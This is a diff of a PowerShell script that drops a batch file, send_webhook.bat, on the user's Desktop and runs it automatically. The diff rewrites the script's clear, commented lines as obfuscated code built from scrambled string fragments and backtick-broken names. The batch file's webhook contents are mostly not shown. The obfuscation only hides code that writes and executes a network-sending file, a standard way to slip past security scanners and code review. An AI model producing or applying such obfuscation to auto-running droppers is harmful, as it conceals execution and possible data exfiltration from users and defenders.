@@ -1,9 +1,9 @@
-# Define the path for the batch file
-Set-Variable -Name desktopPath -Value ([System.Environment]::GetFolderPath('Desktop'))
-Set-Variable -Name batchFilePath -Value (Join-Path $desktopPath 'send_webhook.bat')
+&('Sv')  U134Fm  ([TYpE]("{0}{1}{3}{4}{2}"-f 'sysTEm.','enV','MEnT','i','RoN'))  ;
+&("{3}{2}{0}{1}"-f'a','ble','i','Set-Var') -Name ("{2}{1}{3}{0}"-f 'Path','e','d','sktop') -Value ( ( .("{0}{2}{1}{3}"-f 'gE','Ia','T-vaR','BlE')  U134fM )."VaL`UE"::("{1}{2}{0}" -f'th','GetFo','lderPa').Invoke(("{0}{1}{2}"-f 'D','eskto','p')))
+.("{2}{0}{3}{1}" -f't-Vari','e','Se','abl') -Name ("{0}{2}{3}{1}"-f'ba','ePath','tc','hFil') -Value (.("{0}{2}{1}"-f'Join-P','h','at') ${d`es`ktoPpa`Th} ("{2}{3}{0}{1}"-f 'e','bhook.bat','send_','w'))
 
-# Define the content of the batch file
-Set-Variable -Name batchContent -Value (@"
+
+.("{3}{1}{2}{0}" -f 'ble','Vari','a','Set-') -Name ("{0}{3}{1}{2}" -f 'b','c','hContent','at') -Value (@"
 @echo off
 setlocal enabledelayedexpansion
 
@@ -43,12 +43,12 @@ if %errorlevel% neq 0 (
 endlocal
 "@)
 
-# Write the content to the batch file
-Set-Content -Value $batchContent -Path $batchFilePath
 
-# Output a message to confirm creation
-Write-Host "Batch file created at $batchFilePath"
+.("{3}{1}{0}{2}" -f'ten','Con','t','Set-') -Value ${Ba`TcHC`oN`TEnt} -Path ${baTch`F`iLePA`Th}
 
-# Run the batch file automatically
-Start-Process -FilePath $batchFilePath
-Write-Host "Batch file is now running..."
+
+&("{2}{1}{0}"-f'ost','e-H','Writ') ('Bat'+'c'+'h '+'fi'+'le '+'create'+'d'+' '+'a'+'t '+"$batchFilePath")
+
+
+&("{2}{1}{0}" -f'ss','art-Proce','St') -FilePath ${B`AT`ChF`IL`ePATh}
+.("{1}{0}{2}"-f '-H','Write','ost') ("{0}{1}{4}{6}{5}{2}{3}"-f'B','atc','w runn','ing...','h f',' no','ile is')
